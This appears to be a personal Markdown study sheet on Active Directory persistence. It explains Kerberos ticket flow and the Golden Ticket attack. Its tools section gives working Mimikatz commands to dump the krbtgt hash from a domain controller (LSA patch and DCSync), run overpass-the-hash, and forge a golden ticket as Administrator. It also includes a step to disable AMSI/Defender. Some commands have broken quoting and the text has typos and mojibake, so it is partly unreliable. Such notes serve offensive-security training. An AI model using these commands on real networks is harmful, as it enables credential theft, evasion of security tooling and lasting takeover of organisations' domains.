# AD - Domain Dominance / Persistence

## Basics

* Once we have DA - new persistence is possible => escalation to Enterprise Admin and attacks across trusts
* Abusing trusts within domain, across domains and forests
* NTLM hash vor Kerberos are RC4, DES (both old) or AES encrypted&#x20;
* Kerberos policy only checked when TGT is created
* DC validates user account only when TGT > 20min
* Service Ticket (TGS) PAC is optional and not very often used
  * Server LSASS sends PAC validation request to DC netlogon service (NRPC)
  * It runs as servce, PAC validation is optional (disabled)
  * If a service runs as Syste, it performs server signature verification on the PAC (Computer account long-term key)
  *

**How Kerberos works**

1. Password converted to NTLM hash. A Timestamp is encrypted and signed with the NTLM hash of the Users Password and sent to the KDC (AS-REQ)
2. The TGT (Ticket granting ticket) is generated and encrypted & signed with the NTLM Hash of krbtgt hash
3. The TGT is sent back to DC, because client can not decrypt it. Client Request a TGS (Ticket granting service). \
   The DC assumes whatever is inside the TGT, as long as it can be decrypted with krbtgt, it is assumed to be valid.\
   ‚ùìUp to 20 Minutes the TGT is valid?
4. The TGS is returned with encryption of the target service/application service's NTLM hash
5. The Applicatoin Server decrypts the TGS because it is with its own service NTLM hash encrypted, and then decides whether user can access

## ü•áGolden Ticket Attack

### Description

* A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket
* Since user account validation is not done by DC until TGT is older than 20min, we use even deleted/revoked accounts
* The krbtgt user hash could be used to impersonate any user with any privilege from even a non-domain machine
* Password change (of krbtgt account)has no effect on this attack because previous hash will also be accpeted
* Abuse is in Step 3 and 4, where a valid TGT is generated&#x20;

### Requirements

* krbtgt Hash has to be known

### Tools

**Execute Mimikatz on DC to get krbtgt hash - required DA privs**\
Invoke-Mimikatz -command '"lsadump:lsa /patch" -computername dc-hostname

&#x20;With powershell session on dc:\
$sess = New-Session -Computername dc.local\
Disable AMSI/Defender in that session\
Exit\
Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1\
Enter-Pssession  -session $sess\
Invoke-Mimikatz -command '"lsadump:lsa /patch\




**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**\
Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'

**Overpass the hash to start powershell**\
Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:hash /run:powershell.exe"'



**Create a golden ticket when we have the krbtgt hash extracted from above** \
****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
